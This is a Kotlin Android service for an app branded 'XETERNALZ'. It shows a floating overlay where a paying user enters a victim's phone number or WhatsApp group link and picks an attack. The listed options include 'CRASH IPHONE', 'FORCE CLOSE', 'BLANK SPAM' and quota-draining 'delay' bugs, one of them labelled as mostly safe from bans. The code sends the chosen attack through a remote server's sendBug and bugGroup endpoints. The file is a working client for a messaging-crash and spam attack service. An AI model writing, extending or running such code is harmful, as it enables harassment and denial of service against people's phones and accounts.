package com.x.xeternalz

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.view.inputmethod.InputMethodManager
import android.widget.EditText
import android.widget.HorizontalScrollView
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import org.json.JSONArray
import java.io.IOException

class FloatingBaggerService : Service() {
    
    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var expandedView: View
    private var isExpanded = false
    private var isDragging = false
    private var initialX = 0
    private var initialY = 0
    private var initialTouchX = 0f
    private var initialTouchY = 0f
    
    private var username = ""
    private var sessionKey = ""
    private var role = ""
    private var expiredDate = ""
    private var selectedBugId = "1"
    private var isGroupMode = false
    
    private val listBug = mutableListOf<Map<String, String>>()
    
    private val client = OkHttpClient()
    private val CHANNEL_ID = "floating_bagger_channel"
    private val NOTIFICATION_ID = 1001
    
    private val primaryDark = Color.parseColor("#FF000000")
    private val cardDark = Color.parseColor("#FF1A1A1A")
    private val cardDarker = Color.parseColor("#FF0D0D0D")
    private val goldColor = Color.parseColor("#FFFFD700")
    private val blueColor = Color.parseColor("#FF4A9EFF")
    private val redColor = Color.parseColor("#FFDC143C")
    private val whiteColor = Color.parseColor("#FFFFFFFF")
    
    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Floating Bagger Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("XETERNALZ APPS")
            .setContentText("Floating Bagger Aktif")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    override fun onBind(intent: Intent): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            username = it.getStringExtra("username") ?: "User"
            sessionKey = it.getStringExtra("sessionKey") ?: ""
            role = it.getStringExtra("role") ?: "FREE"
            expiredDate = it.getStringExtra("expiredDate") ?: "No Expiry"
        }
        
        showFloatingView()
        fetchBugList()
        return START_STICKY
    }
    
    private fun fetchBugList() {
        val request = Request.Builder()
            .url("http://daxxserverdo.pain.my.id/:2001/getBugList?key=$sessionKey")
            .get()
            .build()
        
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                CoroutineScope(Dispatchers.Main).launch {
                    addDefaultBugList()
                }
            }
            
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                CoroutineScope(Dispatchers.Main).launch {
                    try {
                        val json = JSONObject(body ?: "{}")
                        if (json.optBoolean("status", false)) {
                            val bugsArray = json.optJSONArray("data") ?: JSONArray()
                            listBug.clear()
                            for (i in 0 until bugsArray.length()) {
                                val bug = bugsArray.getJSONObject(i)
                                listBug.add(mapOf(
                                    "bug_id" to bug.optString("bug_id", "1"),
                                    "bug_name" to bug.optString("bug_name", "Unknown")
                                ))
                            }
                            if (listBug.isNotEmpty()) {
                                selectedBugId = listBug[0]["bug_id"] ?: "1"
                            }
                            updateBugList()
                        } else {
                            addDefaultBugList()
                        }
                    } catch (e: Exception) {
                        addDefaultBugList()
                    }
                }
            }
        })
    }
    
    private fun addDefaultBugList() {
        listBug.clear()
        listBug.add(mapOf("bug_id" to "layinvisible", "bug_name" to "DELAY INVISIBLE BEBAS SPAM ( 80% AMAN DARI KENON )"))
        listBug.add(mapOf("bug_id" to "click", "bug_name" to "BLANK CLICK X FORCE CLOSE NEW"))
        listBug.add(mapOf("bug_id" to "blank_spam", "bug_name" to "BLANK SPAM MESSAGE TO TARGET"))
        listBug.add(mapOf("bug_id" to "spam_call", "bug_name" to "BLANK SYSTEM ANDORID NEW"))
        listBug.add(mapOf("bug_id" to "hard", "bug_name" to "COMBO ALL BLANK ANDROID"))
        listBug.add(mapOf("bug_id" to "delay", "bug_name" to "DELAY HARD INVISIBLE MESSAGE NEW"))
        listBug.add(mapOf("bug_id" to "dozer", "bug_name" to "DELAY BULDOZER SEDOT QUOTA INVISIBLE"))
        listBug.add(mapOf("bug_id" to "fcclick", "bug_name" to "FORCE CLOSE CLICK X FREZEE NEW"))
        listBug.add(mapOf("bug_id" to "crash_ios", "bug_name" to "CRASH IPHONE SPAM MESSAGE NEW'"))
        listBug.add(mapOf("bug_id" to "kill_ios", "bug_name" to "COMBO ALL CRASH IPHONE LIST'"))
        selectedBugId = "1"
        updateBugList()
    }
    
    
    private fun updateBugList() {
        if (::expandedView.isInitialized) {
            val bugListContainer = expandedView.findViewById<LinearLayout>(R.id.bug_list_container)
            setupBugList(bugListContainer)
        }
    }
    
    private fun showFloatingView() {
        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_icon, null)
        expandedView = LayoutInflater.from(this).inflate(R.layout.floating_expanded, null)
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 50
        params.y = 100
        params.alpha = 0.85f
        
        windowManager.addView(floatingView, params)
        setupFloatingIcon()
    }
    
    private fun setupFloatingIcon() {
        val icon = floatingView.findViewById<ImageView>(R.id.floating_icon)
        icon.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    isDragging = false
                    initialX = (floatingView.layoutParams as WindowManager.LayoutParams).x
                    initialY = (floatingView.layoutParams as WindowManager.LayoutParams).y
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val params = floatingView.layoutParams as WindowManager.LayoutParams
                    params.x = initialX + (event.rawX - initialTouchX).toInt()
                    params.y = initialY + (event.rawY - initialTouchY).toInt()
                    windowManager.updateViewLayout(floatingView, params)
                    isDragging = true
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!isDragging) {
                        toggleExpand()
                    }
                    true
                }
                else -> false
            }
        }
    }
    
    private fun setFocusable(focusable: Boolean) {
        try {
            val params = expandedView.layoutParams as WindowManager.LayoutParams
            if (focusable) {
                params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
            } else {
                params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            }
            windowManager.updateViewLayout(expandedView, params)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    private fun showKeyboard(view: View) {
        view.requestFocus()
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.showSoftInput(view, InputMethodManager.SHOW_IMPLICIT)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }, 200)
    }
    
    private fun toggleExpand() {
        if (isExpanded) {
            windowManager.removeView(expandedView)
            isExpanded = false
            
            val iconParams = floatingView.layoutParams as WindowManager.LayoutParams
            iconParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            windowManager.updateViewLayout(floatingView, iconParams)
            
        } else {
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            )
            
            params.gravity = Gravity.CENTER
            params.width = (resources.displayMetrics.widthPixels * 0.9).toInt()
            params.alpha = 0.95f
            
            val iconParams = floatingView.layoutParams as WindowManager.LayoutParams
            iconParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            windowManager.updateViewLayout(floatingView, iconParams)
            
            windowManager.addView(expandedView, params)
            setupExpandedView()
            isExpanded = true
        }
    }
    
    private fun setupExpandedView() {
        val tvUsername = expandedView.findViewById<TextView>(R.id.tv_username)
        val tvRole = expandedView.findViewById<TextView>(R.id.tv_role)
        val tvExpired = expandedView.findViewById<TextView>(R.id.tv_expired)
        val modeContact = expandedView.findViewById<LinearLayout>(R.id.mode_contact)
        val modeGroup = expandedView.findViewById<LinearLayout>(R.id.mode_group)
        val etTarget = expandedView.findViewById<EditText>(R.id.et_target)
        val tvModeTitle = expandedView.findViewById<TextView>(R.id.tv_mode_title)
        val iconMode = expandedView.findViewById<ImageView>(R.id.icon_mode)
        val bugScrollView = expandedView.findViewById<HorizontalScrollView>(R.id.bug_scroll_view)
        val bugListContainer = expandedView.findViewById<LinearLayout>(R.id.bug_list_container)
        val groupInfo = expandedView.findViewById<LinearLayout>(R.id.group_info)
        val btnSend = expandedView.findViewById<TextView>(R.id.btn_send)
        val btnClose = expandedView.findViewById<ImageView>(R.id.btn_close)
        
        tvUsername.text = username
        tvUsername.setTextColor(whiteColor)
        
        tvRole.text = role.uppercase()
        tvRole.setTextColor(redColor)
        
        tvExpired.text = "EXP: $expiredDate"
        tvExpired.setTextColor(goldColor)
        
        updateModeButtons(modeContact, modeGroup, true)
        setupBugList(bugListContainer)
        
        etTarget.setOnClickListener {
            setFocusable(true)
            showKeyboard(etTarget)
        }
        
        etTarget.setOnFocusChangeListener { _, hasFocus ->
            if (hasFocus) {
                setFocusable(true)
            }
        }
        
        modeContact.setOnClickListener {
            isGroupMode = false
            updateModeButtons(modeContact, modeGroup, true)
            etTarget.hint = "e.g. +62xxxxxxxxxx"
            etTarget.inputType = InputType.TYPE_CLASS_PHONE
            tvModeTitle.text = "Target Number"
            iconMode.setImageResource(android.R.drawable.ic_menu_call)
            groupInfo.visibility = View.GONE
            bugScrollView.visibility = View.VISIBLE
            setFocusable(false)
        }
        
        modeGroup.setOnClickListener {
            isGroupMode = true
            updateModeButtons(modeContact, modeGroup, false)
            etTarget.hint = "https://chat.whatsapp.com/..."
            etTarget.inputType = InputType.TYPE_CLASS_TEXT
            tvModeTitle.text = "Group Link"
            iconMode.setImageResource(android.R.drawable.ic_menu_gallery)
            groupInfo.visibility = View.VISIBLE
            bugScrollView.visibility = View.GONE
            setFocusable(false)
        }
        
        btnSend.setOnClickListener {
            val target = etTarget.text.toString().trim()
            if (target.isEmpty()) {
                Toast.makeText(this, "Masukkan target terlebih dahulu", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            
            if (!isGroupMode) {
                if (!target.startsWith("+")) {
                    Toast.makeText(this, "Gunakan format internasional (e.g. +62xxx)", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                if (target.length < 8) {
                    Toast.makeText(this, "Nomor terlalu pendek", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
            } else {
                if (!target.contains("chat.whatsapp.com")) {
                    Toast.makeText(this, "Link grup tidak valid", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
            }
            
            setFocusable(false)
            sendBug(target)
        }
        
        btnClose.setOnClickListener {
            setFocusable(false)
            toggleExpand()
        }
    }
    
    private fun setupBugList(container: LinearLayout) {
        container.removeAllViews()
        container.isFocusable = true
        container.isFocusableInTouchMode = true
        
        if (listBug.isEmpty()) {
            addDefaultBugList()
        }
        
        for (bug in listBug) {
            val bugView = LayoutInflater.from(this).inflate(R.layout.bug_item, container, false)
            val tvBugName = bugView.findViewById<TextView>(R.id.tv_bug_name)
            val ivSelected = bugView.findViewById<ImageView>(R.id.iv_selected)
            
            tvBugName.text = bug["bug_name"]
            
            bugView.isFocusable = true
            bugView.isClickable = true
            
            bugView.setOnClickListener {
                selectedBugId = bug["bug_id"] ?: "1"
                for (i in 0 until container.childCount) {
                    val child = container.getChildAt(i)
                    child.findViewById<ImageView>(R.id.iv_selected).visibility = View.GONE
                    child.setBackgroundResource(R.drawable.bug_item_bg)
                }
                bugView.setBackgroundResource(R.drawable.bug_item_selected_bg)
                ivSelected.visibility = View.VISIBLE
            }
            
            if (bug["bug_id"] == selectedBugId) {
                bugView.setBackgroundResource(R.drawable.bug_item_selected_bg)
                ivSelected.visibility = View.VISIBLE
            }
            
            container.addView(bugView)
        }
    }
    
    private fun updateModeButtons(modeContact: LinearLayout, modeGroup: LinearLayout, isContactSelected: Boolean) {
        val contactBg = modeContact.background as GradientDrawable
        val groupBg = modeGroup.background as GradientDrawable
        
        if (isContactSelected) {
            contactBg.setColor(Color.parseColor("#26FFFFFF"))
            contactBg.setStroke(2, Color.parseColor("#4CFFFFFF"))
            groupBg.setColor(Color.parseColor("#0DFFFFFF"))
            groupBg.setStroke(1, Color.parseColor("#1AFFFFFF"))
        } else {
            groupBg.setColor(Color.parseColor("#26FFFFFF"))
            groupBg.setStroke(2, Color.parseColor("#4CFFFFFF"))
            contactBg.setColor(Color.parseColor("#0DFFFFFF"))
            contactBg.setStroke(1, Color.parseColor("#1AFFFFFF"))
        }
    }
    
    private fun sendBug(target: String) {
        val url = if (!isGroupMode) {
            "http://daxxserverdo.pain.my.id/:2001/sendBug?key=$sessionKey&target=$target&bug=$selectedBugId"
        } else {
            "http://daxxserverdo.pain.my.id/:2001/bugGroup?key=$sessionKey&link=$target"
        }
        
        val request = Request.Builder()
            .url(url)
            .get()
            .build()
        
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                CoroutineScope(Dispatchers.Main).launch {
                    showAlert("Error", "Gagal terhubung ke server")
                }
            }
            
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                CoroutineScope(Dispatchers.Main).launch {
                    try {
                        val json = JSONObject(body ?: "{}")
                        
                        if (json.optBoolean("cooldown", false)) {
                            showAlert("Cooldown", "Tunggu beberapa saat.")
                        } else if (json.optBoolean("valid", true) == false) {
                            showAlert("Invalid", "Session key invalid. Silakan login ulang.")
                        } else if (json.optBoolean("sender", true) == false) {
                            showAlert("Failed", "kamu tidak memiliki sender pribadi!\nsilahkan add sender terlebih dahulu")
                        } else if (json.optBoolean("sended", false)) {
                            if (!isGroupMode) {
                                showAlert("Success", "Berhasil mengirim bug ke $target!\nMenggunakan sender pribadi")
                                val etTarget = expandedView.findViewById<EditText>(R.id.et_target)
                                etTarget.text.clear()
                            } else {
                                showAlert("Success", "Successfully sent bug to group!\nUsing private sender")
                                val etTarget = expandedView.findViewById<EditText>(R.id.et_target)
                                etTarget.text.clear()
                            }
                        } else {
                            if (!isGroupMode) {
                                showAlert("Gagal", "Server sedang maintenance.")
                            } else {
                                showAlert("Failed", "Failed to send bug to group. Please try again.")
                            }
                        }
                    } catch (e: Exception) {
                        showAlert("Error", "Terjadi kesalahan. Coba lagi.")
                    }
                }
            }
        })
    }
    
    private fun showAlert(title: String, message: String) {
        val dialogView = LayoutInflater.from(this).inflate(R.layout.floating_dialog, null)
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        
        params.gravity = Gravity.CENTER
        params.width = (resources.displayMetrics.widthPixels * 0.75).toInt()
        params.alpha = 0.95f
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.dialog_title)
        val tvMessage = dialogView.findViewById<TextView>(R.id.dialog_message)
        val btnOk = dialogView.findViewById<TextView>(R.id.btn_ok)
        
        tvTitle.text = title
        tvMessage.text = message
        
        when {
            title.contains("✅") -> tvTitle.setTextColor(Color.parseColor("#00FF88"))
            title.contains("❌") -> tvTitle.setTextColor(Color.parseColor("#FF1744"))
            title.contains("⏳") -> tvTitle.setTextColor(goldColor)
        }
        
        btnOk.setOnClickListener {
            windowManager.removeView(dialogView)
        }
        
        windowManager.addView(dialogView, params)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        try {
            if (::floatingView.isInitialized) {
                windowManager.removeView(floatingView)
            }
            if (::expandedView.isInitialized && isExpanded) {
                windowManager.removeView(expandedView)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    companion object {
        fun Color.parse(color: String): Int {
            return android.graphics.Color.parseColor(color)
        }
    }
}